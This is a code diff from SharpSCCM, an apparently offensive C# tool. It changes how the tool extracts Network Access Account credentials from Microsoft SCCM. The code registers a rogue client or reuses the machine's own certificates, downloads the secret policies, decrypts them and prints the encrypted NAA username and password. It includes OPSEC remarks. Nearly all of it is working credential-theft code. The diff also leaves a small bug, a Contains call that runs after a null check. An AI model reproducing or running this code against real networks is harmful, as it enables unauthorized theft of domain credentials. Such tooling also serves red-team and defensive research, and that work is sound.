@@ -52,22 +52,28 @@ namespace SharpSCCM
             return certificate;
         }
 
-        public static string DecryptPolicyBody(byte[] policyDownloadResponseBytes, MessageCertificateX509 certificate)
+        public static string DecryptPolicyBody(byte[] policyDownloadResponseBytes)
         {
             // Parse response ASN1 and decrypt contents
             ContentInfo contentInfo = new ContentInfo(policyDownloadResponseBytes);
             EnvelopedCms pkcs7EnvelopedCms = new EnvelopedCms(contentInfo);
             pkcs7EnvelopedCms.Decode(policyDownloadResponseBytes);
             RecipientInfo encryptedKey = pkcs7EnvelopedCms.RecipientInfos[0];
-            pkcs7EnvelopedCms.Decrypt(encryptedKey);
-            Console.WriteLine($"[+] Successfully decoded and decrypted secret policy");
-            // Delete the certificate from the current user store
-            DeleteUserCertificate(certificate);
-            string decryptedPolicyBody = Encoding.ASCII.GetString(pkcs7EnvelopedCms.ContentInfo.Content).Replace("\0", string.Empty);
-            return decryptedPolicyBody;
+            try
+            {
+                pkcs7EnvelopedCms.Decrypt(encryptedKey);
+                Console.WriteLine($"[+] Successfully decoded and decrypted secret policy");
+                string decryptedPolicyBody = Encoding.ASCII.GetString(pkcs7EnvelopedCms.ContentInfo.Content).Replace("\0", string.Empty);
+                return decryptedPolicyBody;
+            }
+            catch (Exception e)
+            {
+                Console.WriteLine("[!] Could not decrypt the secret policy");
+                return null;
+            }         
         }
 
-        public static void DeleteUserCertificate(MessageCertificateX509 certificate)
+        public static void DeleteCertificate(MessageCertificateX509 certificate)
         {
             var x509Store = new X509Store("My", StoreLocation.CurrentUser);
             x509Store.Open(OpenFlags.MaxAllowed);
@@ -82,16 +88,37 @@ namespace SharpSCCM
             return certificate;
         }
 
-        public static async void GetNetworkAccessAccounts(string managementPoint, string siteCode, string username = null, string password = null, string outputPath = null)
+        public static async void GetNetworkAccessAccounts(string managementPoint, string siteCode, string username = null, string password = null, string outputPath = null, bool cert = false)
         {
             // Thanks to Adam Chester(@_xpn_) for figuring this out! https://blog.xpnsec.com/unobfuscating-network-access-accounts/
             // Register a new client using NTLM authentication for the specified machine account to automatically approve the new device record, allowing secret policy retrieval
             // OPSEC warning: I'm not sure why, but this method does not work without temporarily storing the certificate on disk
-            MessageCertificateX509 certificate = CreateUserCertificate(null, true);
-            SmsClientId clientId = RegisterClient(certificate, null, managementPoint, siteCode, "Windows", username, password);
-
+            MessageCertificateX509 signingCertificate = null;
+            MessageCertificateX509 encryptionCertificate = null;
+            SmsClientId clientId = null;
+            if (cert)
+            {
+                if (Helpers.IsHighIntegrity())
+                {
+                    signingCertificate = GetMachineSigningCertificate();
+                    encryptionCertificate = GetMachineEncryptionCertificate();
+                    clientId = ClientWmi.GetSmsId();
+                }
+                else
+                {
+                    Console.WriteLine("[!] Cert option can only be used from a high integrity context");
+                    return;
+                }
+            }
+            else
+            {
+                signingCertificate = CreateUserCertificate(null, true);
+                encryptionCertificate = signingCertificate;
+                clientId = RegisterClient(signingCertificate, null, managementPoint, siteCode, "Windows", username, password);
+            }
+            
             // Send request for policy assignments to obtain policy locations
-            ConfigMgrPolicyAssignmentReply assignmentReply = SendPolicyAssignmentRequest(clientId, certificate, managementPoint, siteCode);
+            ConfigMgrPolicyAssignmentReply assignmentReply = SendPolicyAssignmentRequest(clientId, signingCertificate, managementPoint, siteCode);
 
             // Get secret policies
             string output = null;
@@ -106,20 +133,30 @@ namespace SharpSCCM
 
                     // Can't figure out how to authenticate with the SDK so using raw HTTP requests
                     string policyURL = policyAssignment.Policy.Location.Value.Replace("<mp>", managementPoint);
-                    HttpResponseMessage policyDownloadResponse = SendPolicyDownloadRequest(policyURL, clientId.ToString(), certificate);
+                    HttpResponseMessage policyDownloadResponse = SendPolicyDownloadRequest(policyURL, clientId.ToString(), signingCertificate);
                     byte[] policyDownloadResponseBytes = await policyDownloadResponse.Content.ReadAsByteArrayAsync();
                     Console.WriteLine($"[+] Received encoded response from server for policy {policyAssignment.Policy.Id}");
-                    string decryptedPolicyBody = DecryptPolicyBody(policyDownloadResponseBytes, certificate);
-                    output += decryptedPolicyBody;
-                    
-                    if (decryptedPolicyBody.Contains("NetworkAccess"))
+                    string decryptedPolicyBody = DecryptPolicyBody(policyDownloadResponseBytes);
+                    if (decryptedPolicyBody != null)
                     {
+                        output += decryptedPolicyBody;
+                        // Delete the created certificate from the current user store
+                        if (!cert)
+                        {
+                            DeleteCertificate(signingCertificate);
+                        }
+
                         XmlDocument policyXmlDoc = new XmlDocument();
                         policyXmlDoc.LoadXml(decryptedPolicyBody.Trim().Remove(0, 2));
                         string encryptedUsername = policyXmlDoc.SelectSingleNode("//instance").FirstChild.NextSibling.InnerText;
                         string encryptedPassword = policyXmlDoc.SelectSingleNode("//instance").FirstChild.NextSibling.NextSibling.InnerText;
                         Console.WriteLine($"[+] Encrypted NAA username: {encryptedUsername}");
                         Console.WriteLine($"[+] Encrypted NAA password: {encryptedPassword}");
+                    }
+
+                    if (decryptedPolicyBody.Contains("NetworkAccess"))
+                    {
+
                     }
 
                     /*
